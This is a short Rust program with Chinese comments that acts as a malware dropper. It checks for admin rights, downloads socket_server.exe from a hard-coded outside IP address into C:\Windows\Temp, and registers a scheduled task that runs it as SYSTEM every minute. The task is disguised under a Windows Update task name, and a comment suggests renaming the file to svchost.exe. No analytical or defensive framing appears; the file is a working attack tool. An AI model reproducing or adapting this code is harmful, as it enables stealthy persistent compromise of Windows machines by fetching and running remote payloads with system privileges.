use reqwest;
use std::process::Command;

fn is_admin() -> bool {
    if let Ok(output) = Command::new("net").arg("session").output() {
        output.status.success()
    } else {
        false
    }
}

fn main()  -> Result<(), Box<dyn std::error::Error>>{
    println!("Hello, world!");
    if is_admin() {
        println!("当前用户是管理员");
    } else {
        println!("当前用户不是管理员");
    }

    // 下载二进制文件
    let url = "http://52.199.33.63:8000/socket_server.exe";
    let output_path = r"C:\\Windows\\Temp\\socket_server.exe";  //svchost.exe
    let mut response = reqwest::blocking::get(url)?;
    let mut file = std::fs::File::create(output_path)?;
    std::io::copy(&mut response, &mut file)?;

    // // 执行创建计划任务命令
    let output = Command::new("schtasks")
        .args(&[
            "/create",
            "/ru",
            "NT AUTHORITY\\SYSTEM",
            "/rp",
            "",
            "/tn",
            "\\Microsoft\\Windows\\WindowsUpdate\\windows update",
            "/tr",
            "C:\\Windows\\Temp\\socket_server.exe",
            "/sc",
            "minute",
            "/mo",
            "1",
        ])
        .output()?;
    
    if output.status.success() {
        println!("Task created successfully");
    } else {
        println!("Failed to create task");
    }
    Ok(())
}

// // schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "\Microsoft\AdminTasks\Task1" /tr "C:socket_server.exe" /sc minute /mo 1

